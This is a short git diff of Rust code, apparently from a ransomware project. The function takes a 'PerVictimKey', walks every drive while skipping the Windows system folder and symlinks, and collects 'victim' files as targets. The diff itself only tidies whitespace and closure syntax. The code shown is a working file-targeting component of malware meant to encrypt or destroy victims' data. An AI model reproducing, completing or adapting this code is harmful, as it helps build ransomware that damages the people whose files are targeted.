@@ -202,7 +202,7 @@ fn the_boring_loop(key: &PerVictimKey) -> Result<()> {
             }
         })
     };
-    
+
     let system_root = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_owned());
     for drive in drives {
         log::debug!("Walking drive: {:?}", drive);
@@ -210,7 +210,7 @@ fn the_boring_loop(key: &PerVictimKey) -> Result<()> {
         for entry in walker
             .filter_entry(|e| !e.path().starts_with(&system_root))
             .skip_error()
-            .inspect(|e| { log::trace!("Walking entry: {:?}", e); })
+            .inspect(|e| log::trace!("Walking entry: {:?}", e))
             .filter(|e| !e.path_is_symlink() && is_victim_file(&e))
         {
             log::debug!("Target file: {:?}", entry);
